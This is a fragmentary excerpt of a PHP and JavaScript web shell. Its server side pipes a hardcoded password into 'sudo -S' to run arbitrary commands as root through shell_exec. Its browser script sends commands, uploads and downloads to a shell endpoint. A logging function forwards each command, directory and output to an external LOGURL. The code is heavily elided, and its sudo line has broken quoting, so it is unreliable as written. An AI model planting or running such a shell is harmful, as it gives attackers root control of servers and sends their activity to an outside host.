...
function featureHint($fileName, $cwd, $type) {
    ...
    $cmd = "echo password | sudo -S "/bin/bash -c \"$cmd\""";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
    ...
    <head>
        ...
        <script>
                ...
                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                    ...
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
                        if (response.hasOwnProperty('file')) {
                            ...
                            featureLog("download",CWD,command)
                        } else {
                            featureLog(response.stdout.join("\n"),CWD,command)
            ...
            function featureLog(out,cwd,cmd) {
                if(LOGURL!==null)
                {
                    makeRequest(LOGURL+'?feature=log', {out: out, cwd: cwd, cmd: cmd}, function (response) {
